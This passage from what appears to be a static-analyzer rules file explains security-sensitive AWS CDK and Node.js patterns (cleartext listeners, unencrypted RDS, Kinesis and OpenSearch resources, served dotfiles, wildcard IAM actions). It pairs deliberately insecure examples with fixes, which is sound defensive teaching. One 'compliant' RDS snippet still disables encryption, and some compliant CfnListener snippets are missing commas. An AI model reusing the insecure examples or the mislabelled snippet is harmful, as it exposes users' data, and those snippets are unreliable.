ApplicationListener(this, 'listener-http-explicit-constructor', {\n  loadBalancer: alb,\n  protocol: ApplicationProtocol.HTTP, // Sensitive\n  port: 8080,\n  open: true\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkLoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>\n<pre>\nimport { NetworkLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nconst nlb = new NetworkLoadBalancer(this, 'nlb', {\n  vpc: vpc,\n  internetFacing: true\n});\n\nvar listenerNLB = nlb.addListener('listener-tcp-default', {\n  port: 1234\n}); // Sensitive\n\nlistenerNLB = nlb.addListener('listener-tcp-explicit', {\n  protocol: Protocol.TCP, // Sensitive\n  port: 1234\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkListener.html\">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkListener</a>:</p>\n<pre>\nimport { NetworkListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nnew NetworkListener(this, 'listener-tcp-explicit-constructor', {\n  loadBalancer: nlb,\n  protocol: Protocol.TCP, // Sensitive\n  port: 8080\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.CfnListener.html\">aws-cdk-lib.aws-elasticloadbalancingv2.CfnListener</a>:</p>\n<pre>\nimport { CfnListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nnew CfnListener(this, 'listener-http', {\n  defaultActions: defaultActions,\n  loadBalancerArn: alb.loadBalancerArn,\n  protocol: \"HTTP\", // Sensitive\n  port: 80\n});\n\nnew CfnListener(this, 'listener-tcp', {\n  defaultActions: defaultActions,\n  loadBalancerArn: alb.loadBalancerArn,\n  protocol: \"TCP\", // Sensitive\n  port: 80\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.CfnLoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancing.CfnLoadBalancer</a>:</p>\n<pre>\nimport { CfnLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancing';\n\nnew CfnLoadBalancer(this, 'elb-tcp', {\n  listeners: [{\n    instancePort: '1000',\n    loadBalancerPort: '1000',\n    protocol: 'tcp' // Sensitive\n  }]\n});\n\nnew CfnLoadBalancer(this, 'elb-http', {\n  listeners: [{\n    instancePort: '1000',\n    loadBalancerPort: '1000',\n    protocol: 'http' // Sensitive\n  }]\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.LoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancing.LoadBalancer</a>:</p>\n<pre>\nimport { LoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancing';\n\nconst loadBalancer = new LoadBalancer(this, 'elb-tcp-dict', {\n    vpc,\n    internetFacing: true,\n    healthCheck: {\n    port: 80,\n    },\n    listeners: [\n    {\n        externalPort:10000,\n        externalProtocol: LoadBalancingProtocol.TCP, // Sensitive\n        internalPort:10000\n    }]\n});\n\nloadBalancer.addListener({\n  externalPort:10001,\n  externalProtocol:LoadBalancingProtocol.TCP, // Sensitive\n  internalPort:10001\n});\nloadBalancer.addListener({\n  externalPort:10002,\n  externalProtocol:LoadBalancingProtocol.HTTP, // Sensitive\n  internalPort:10002\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticache.CfnReplicationGroup.html\">aws-cdk-lib.aws-elasticache.CfnReplicationGroup</a>:</p>\n<pre>\nimport { CfnReplicationGroup } from 'aws-cdk-lib/aws-elasticache';\n\nnew CfnReplicationGroup(this, 'unencrypted-implicit', {\n  replicationGroupDescription: 'exampleDescription'\n}); // Sensitive\n\nnew CfnReplicationGroup(this, 'unencrypted-explicit', {\n  replicationGroupDescription: 'exampleDescription',\n  transitEncryptionEnabled: false // Sensitive\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.CfnStream.html\">aws-cdk-lib.aws-kinesis.CfnStream</a>:</p>\n<pre>\nimport { CfnStream } from 'aws-cdk-lib/aws-kinesis';\n\nnew CfnStream(this, 'cfnstream-implicit-unencrytped', undefined); // Sensitive\n\nnew CfnStream(this, 'cfnstream-explicit-unencrytped', {\n  streamEncryption: undefined // Sensitive\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.Stream.html\">aws-cdk-lib.aws-kinesis.Stream</a>:</p>\n<pre>\nimport { Stream } from 'aws-cdk-lib/aws-kinesis';\n\nnew Stream(this, 'stream-explicit-unencrypted', {\n  encryption: StreamEncryption.UNENCRYPTED // Sensitive\n});\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nurl = \"https://example.com\";\nurl = \"sftp://anonymous@example.com\";\nurl = \"ssh://anonymous@example.com\";\n</pre>\n<p>For <a href=\"https://nodemailer.com\">nodemailer</a> one of the following options must be set:</p>\n<pre>\nconst nodemailer = require(\"nodemailer\");\nlet transporter = nodemailer.createTransport({\n  secure: true,\n  requireTLS: true,\n  port: 465,\n  secured: true\n});\n</pre>\n<p>For <a href=\"https://github.com/mscdex/node-ftp\">ftp</a>:</p>\n<pre>\nvar Client = require('ftp');\nvar c = new Client();\nc.connect({\n  'secure': true\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationLoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>\n<pre>\nimport { ApplicationLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nconst alb = new ApplicationLoadBalancer(this, 'ALB', {\n  vpc: vpc,\n  internetFacing: true\n});\n\nalb.addListener('listener-https-explicit', {\n  protocol: ApplicationProtocol.HTTPS,\n  port: 8080,\n  open: true,\n  certificates: [certificate]\n});\n\nalb.addListener('listener-https-implicit', {\n  port: 8080,\n  open: true,\n  certificates: [certificate]\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationListener.html\">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationListener</a>:</p>\n<pre>\nimport { ApplicationListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nnew ApplicationListener(this, 'listener-https-explicit', {\n  loadBalancer: loadBalancer,\n  protocol: ApplicationProtocol.HTTPS,\n  port: 8080,\n  open: true,\n  certificates: [certificate]\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkLoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>\n<pre>\nimport { NetworkLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nconst nlb = new NetworkLoadBalancer(this, 'nlb', {\n  vpc: vpc,\n  internetFacing: true\n});\n\nnlb.addListener('listener-tls-explicit', {\n  protocol: Protocol.TLS,\n  port: 1234,\n  certificates: [certificate]\n});\n\nnlb.addListener('listener-tls-implicit', {\n  port: 1234,\n  certificates: [certificate]\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkListener.html\">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkListener</a>:</p>\n<pre>\nimport { NetworkListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nnew NetworkListener(this, 'listener-tls-explicit', {\n  loadBalancer: loadBalancer,\n  protocol: Protocol.TLS,\n  port: 8080,\n  certificates: [certificate]\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.CfnListener.html\">aws-cdk-lib.aws-elasticloadbalancingv2.CfnListener</a>:</p>\n<pre>\nimport { CfnListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nnew CfnListener(this, 'listener-https', {\n  defaultActions: defaultActions,\n  loadBalancerArn: loadBalancerArn,\n  protocol: \"HTTPS\",\n  port: 80\n  certificates: [certificate]\n});\n\nnew CfnListener(this, 'listener-tls', {\n  defaultActions: defaultActions,\n  loadBalancerArn: loadBalancerArn,\n  protocol: \"TLS\",\n  port: 80\n  certificates: [certificate]\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.CfnLoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancing.CfnLoadBalancer</a>:</p>\n<pre>\nimport { CfnLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancing';\n\nnew CfnLoadBalancer(this, 'elb-ssl', {\n  listeners: [{\n    instancePort: '1000',\n    loadBalancerPort: '1000',\n    protocol: 'ssl',\n    sslCertificateId: sslCertificateId\n  }]\n});\n\nnew CfnLoadBalancer(this, 'elb-https', {\n  listeners: [{\n    instancePort: '1000',\n    loadBalancerPort: '1000',\n    protocol: 'https',\n    sslCertificateId: sslCertificateId\n  }]\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.LoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancing.LoadBalancer</a>:</p>\n<pre>\nimport { LoadBalancer, LoadBalancingProtocol } from 'aws-cdk-lib/aws-elasticloadbalancing';\n\nconst lb = new LoadBalancer(this, 'elb-ssl', {\n  vpc,\n  internetFacing: true,\n  healthCheck: {\n    port: 80,\n  },\n  listeners: [\n    {\n      externalPort:10000,\n      externalProtocol:LoadBalancingProtocol.SSL,\n      internalPort:10000\n    }]\n});\n\nlb.addListener({\n  externalPort:10001,\n  externalProtocol:LoadBalancingProtocol.SSL,\n  internalPort:10001\n});\nlb.addListener({\n  externalPort:10002,\n  externalProtocol:LoadBalancingProtocol.HTTPS,\n  internalPort:10002\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticache.CfnReplicationGroup.html\">aws-cdk-lib.aws-elasticache.CfnReplicationGroup</a>:</p>\n<pre>\nimport { CfnReplicationGroup } from 'aws-cdk-lib/aws-elasticache';\n\nnew CfnReplicationGroup(this, 'encrypted-explicit', {\n  replicationGroupDescription: 'example',\n  transitEncryptionEnabled: true\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.Stream.html\">aws-cdk-lib.aws-kinesis.Stream</a>:</p>\n<pre>\nimport { Stream } from 'aws-cdk-lib/aws-kinesis';\n\nnew Stream(this, 'stream-implicit-encrypted');\n\nnew Stream(this, 'stream-explicit-encrypted-selfmanaged', {\n  encryption: StreamEncryption.KMS,\n  encryptionKey: encryptionKey,\n});\n\nnew Stream(this, 'stream-explicit-encrypted-managed', {\n  encryption: StreamEncryption.MANAGED\n});\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.CfnStream.html\">aws-cdk-lib.aws-kinesis.CfnStream</a>:</p>\n<pre>\nimport { CfnStream } from 'aws-cdk-lib/aws-kinesis';\n\nnew CfnStream(this, 'cfnstream-explicit-encrypted', {\n  streamEncryption: {\n    encryptionType: encryptionType,\n    keyId: encryptionKey.keyId,\n  }\n});\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data Exposure\n  </a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Documentation</a> - Listeners\n  for your Application Load Balancers </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html\">AWS\n  Documentation</a> - Stream Encryption </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S5691": {
        "name": "Statically serving hidden files is security-sensitive",
        "htmlDesc": "<p>Hidden files are created automatically by many tools to save user-preferences, well-known examples are <code>.profile</code>, <code>.bashrc</code>,\n<code>.bash_history</code> or .<code>git</code>. To simplify the view these files are not displayed by default using operating system commands like\n<code>ls</code>.</p>\n<p>Outside of the user environment, hidden files are sensitive because they are used to store privacy-related information or even hard-coded\nsecrets.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Hidden files may have been inadvertently uploaded to the static server’s public directory and it accepts requests to hidden files. </li>\n  <li> There is no business use cases linked to serve files in <code>.name</code> format but the server is not configured to reject requests to this\n  type of files. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Disable the serving of hidden files. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://www.npmjs.com/package/serve-static\">Express.js serve-static</a> middleware:</p>\n<pre>\nlet serveStatic = require(\"serve-static\");\nlet app = express();\nlet serveStaticMiddleware = serveStatic('public', { 'index': false, 'dotfiles': 'allow'});   // Sensitive\napp.use(serveStaticMiddleware);\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://www.npmjs.com/package/serve-static\">Express.js serve-static</a> middleware:</p>\n<pre>\nlet serveStatic = require(\"serve-static\");\nlet app = express();\nlet serveStaticMiddleware = serveStatic('public', { 'index': false, 'dotfiles': 'ignore'});   // Compliant: ignore or deny are recommended values\nlet serveStaticDefault = serveStatic('public', { 'index': false});   // Compliant: by default, \"dotfiles\" (file or directory that begins with a dot) are not served (with the exception that files within a directory that begins with a dot are not ignored), see serve-static module documentation\napp.use(serveStaticMiddleware);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://github.com/mtojek/go-url-fuzzer\">github.com/mtojek/go-url-fuzzer</a> - Discover hidden files and directories on a web server.\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/538\">CWE-538 - File and Directory Information Exposure</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javascript:S6302": {
        "name": "Policies granting all privileges are security-sensitive",
        "htmlDesc": "<p>A policy that grants all permissions may indicate an improper access control, which violates <a\nhref=\"https://en.wikipedia.org/wiki/Principle_of_least_privilege\">the principle of least privilege</a>. Suppose an identity is granted full\npermissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources\nmay occur and therefore result in loss of information.</p>\n<h2>Ask Yourself Whether</h2>\n<p>Identities obtaining all the permissions:</p>\n<ul>\n  <li> only require a subset of these permissions to perform the intended function. </li>\n  <li> have monitored activity showing that only a subset of these permissions is actually used. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start\nwith the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in\nproduction, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>\n<h2>Sensitive Code Example</h2>\n<p>A customer-managed policy that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>\n<pre>\nimport { aws_iam as iam } from 'aws-cdk-lib'\n\nnew iam.PolicyStatement({\n    effect: iam.Effect.ALLOW,\n    actions: [\"*\"], // Sensitive\n    resources: [\"arn:aws:iam:::user/*\"],\n})\n</pre>\n<h2>Compliant Solution</h2>\n<p>A customer-managed policy that grants only the required permissions:</p>\n<pre>\nimport { aws_iam as iam } from 'aws-cdk-lib'\n\nnew iam.PolicyStatement({\n    effect: iam.Effect.ALLOW,\n    actions: [\"iam:GetAccountSummary\"],\n    resources: [\"arn:aws:iam:::user/*\"],\n})\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> <a href=\"https://cloud.google.com/iam/docs/understanding-roles\">Google Cloud Documentation</a> - Understanding roles </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javascript:S6303": {
        "name": "Using unencrypted RDS DB resources is security-sensitive",
        "htmlDesc": "<p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br> This includes database data, logs, automatic backups, read replicas,\nsnapshots, and cluster metadata.</p>\n<p>This situation can occur in a variety of scenarios, such as:</p>\n<ul>\n  <li> A malicious insider working at the cloud provider gains physical access to the storage device. </li>\n  <li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li>\n</ul>\n<p>After a successful intrusion, the underlying applications are exposed to:</p>\n<ul>\n  <li> theft of intellectual property and/or personal data </li>\n  <li> extortion </li>\n  <li> denial of services and security bypasses via data corruption or deletion </li>\n</ul>\n<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The database contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br> In any case, no further maintenance is\nrequired as encryption at rest is fully managed by AWS.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html\"><code>aws-cdk-lib.aws_rds.CfnDBCluster</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\nnew rds.CfnDBCluster(this, 'example', {\n  storageEncrypted: false, // Sensitive\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html\"><code>aws-cdk-lib.aws_rds.CfnDBInstance</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\nnew rds.CfnDBInstance(this, 'example', {\n  storageEncrypted: false, // Sensitive\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html\"><code>aws-cdk-lib.aws_rds.DatabaseCluster</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\nimport { aws_ec2 as ec2 } from 'aws-cdk-lib';\n\ndeclare const vpc: ec2.Vpc;\n\nconst cluster = new rds.DatabaseCluster(this, 'example', {\n  engine: rds.DatabaseClusterEngine.auroraMysql({ version: rds.AuroraMysqlEngineVersion.VER_2_08_1 }),\n  instanceProps: {\n    vpcSubnets: {\n      subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,\n    },\n    vpc,\n  },\n  storageEncrypted: false, // Sensitive\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot.html\"><code>aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\ndeclare const vpc: ec2.Vpc;\n\nnew rds.DatabaseClusterFromSnapshot(this, 'example', {\n  engine: rds.DatabaseClusterEngine.aurora({ version: rds.AuroraEngineVersion.VER_1_22_2 }),\n  instanceProps: {\n    vpc,\n  },\n  snapshotIdentifier: 'exampleSnapshot',\n  storageEncrypted: false, // Sensitive\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html\"><code>aws-cdk-lib.aws_rds.DatabaseInstance</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\ndeclare const vpc: ec2.Vpc;\n\nnew rds.DatabaseInstance(this, 'example', {\n  engine: rds.DatabaseInstanceEngine.POSTGRES,\n  vpc,\n  storageEncrypted: false, // Sensitive\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica.html\"><code>aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\ndeclare const sourceInstance: rds.DatabaseInstance;\n\nnew rds.DatabaseInstanceReadReplica(this, 'example', {\n  sourceDatabaseInstance: sourceInstance,\n  instanceType: ec2.InstanceType.of(ec2.InstanceClass.BURSTABLE2, ec2.InstanceSize.LARGE),\n  vpc,\n  storageEncrypted: false, // Sensitive\n});\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html\"><code>aws-cdk-lib.aws_rds.CfnDBCluster</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\nnew rds.CfnDBCluster(this, 'example', {\n  storageEncrypted: true,\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html\"><code>aws-cdk-lib.aws_rds.CfnDBInstance</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\nnew rds.CfnDBInstance(this, 'example', {\n  storageEncrypted: true,\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html\"><code>aws-cdk-lib.aws_rds.DatabaseCluster</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\ndeclare const vpc: ec2.Vpc;\n\nconst cluster = new rds.DatabaseCluster(this, 'example', {\n  engine: rds.DatabaseClusterEngine.auroraMysql({ version: rds.AuroraMysqlEngineVersion.VER_2_08_1 }),\n  instanceProps: {\n    vpcSubnets: {\n      subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,\n    },\n    vpc,\n  },\n  storageEncrypted: false, // Sensitive\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot.html\"><code>aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\ndeclare const vpc: ec2.Vpc;\n\nnew rds.DatabaseClusterFromSnapshot(this, 'example', {\n  engine: rds.DatabaseClusterEngine.aurora({ version: rds.AuroraEngineVersion.VER_1_22_2 }),\n  instanceProps: {\n    vpc,\n  },\n  snapshotIdentifier: 'exampleSnapshot',\n  storageEncrypted: true,\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html\"><code>aws-cdk-lib.aws_rds.DatabaseInstance</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\ndeclare const vpc: ec2.Vpc;\n\nnew rds.DatabaseInstance(this, 'example', {\n  engine: rds.DatabaseInstanceEngine.POSTGRES,\n  vpc,\n  storageEncrypted: true,\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica.html\"><code>aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica</code></a>:</p>\n<pre>\nimport { aws_rds as rds } from 'aws-cdk-lib';\n\ndeclare const sourceInstance: rds.DatabaseInstance;\n\nnew rds.DatabaseInstanceReadReplica(this, 'example', {\n  sourceDatabaseInstance: sourceInstance,\n  instanceType: ec2.InstanceType.of(ec2.InstanceClass.BURSTABLE2, ec2.InstanceSize.LARGE),\n  vpc,\n  storageEncrypted: true,\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html\">AWS Documentation</a> - Encrypting Amazon RDS\n  resources </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javascript:S6308": {
        "name": "Using unencrypted Elasticsearch domains is security-sensitive",
        "htmlDesc": "<p>Amazon OpenSearch Service is a managed service to host OpenSearch instances. It replaces Elasticsearch Service, which has been deprecated.</p>\n<p>To harden domain (cluster) data in case of unauthorized access, OpenSearch provides data-at-rest encryption if the engine is OpenSearch (any\nversion), or Elasticsearch with a version of 5.1 or above. Enabling encryption at rest will help protect:</p>\n<ul>\n  <li> indices </li>\n  <li> logs </li>\n  <li> swap files </li>\n  <li> data in the application directory </li>\n  <li> automated snapshots </li>\n</ul>\n<p>Thus, adversaries cannot access the data if they gain physical access to the storage medium.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The database contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to encrypt OpenSearch domains that contain sensitive information.</p>\n<p>OpenSearch handles encryption and decryption transparently, so no further modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.Domain.html\">aws-cdk-lib.aws_opensearchservice.Domain</a>:</p>\n<pre>\nimport { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';\n\nconst exampleDomain = new opensearchservice.Domain(this, 'ExampleDomain', {\n  version: EngineVersion.OPENSEARCH_1_3,\n}); // Sensitive, encryption must be explicitly enabled\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.CfnDomain.html\">aws-cdk-lib.aws_opensearchservice.CfnDomain</a>:</p>\n<pre>\nimport { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';\n\nconst exampleCfnDomain = new opensearchservice.CfnDomain(this, 'ExampleCfnDomain', {\n  engineVersion: 'OpenSearch_1.3',\n}); // Sensitive, encryption must be explicitly enabled\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.Domain.html\">aws-cdk-lib.aws_opensearchservice.Domain</a>:</p>\n<pre>\nimport { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';\n\nconst exampleDomain = new opensearchservice.Domain(this, 'ExampleDomain', {\n  version: EngineVersion.OPENSEARCH_1_3,\n  encryptionAtRest: {\n    enabled: true,\n  },\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.CfnDomain.html\">aws-cdk-lib.aws_opensearchservice.CfnDomain</a>:</p>\n<pre>\nimport { aws_opensearchservice as opensearchservice } from 'aws-cdk-lib';\n\nconst exampleCfnDomain = new opensearchservice.CfnDomain(this, 'ExampleCfnDomain', {\n  engineVersion: 'OpenSearch_1.3',\n  encryptionAtRestOptions: {\n    enabled: true,\n  },\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a 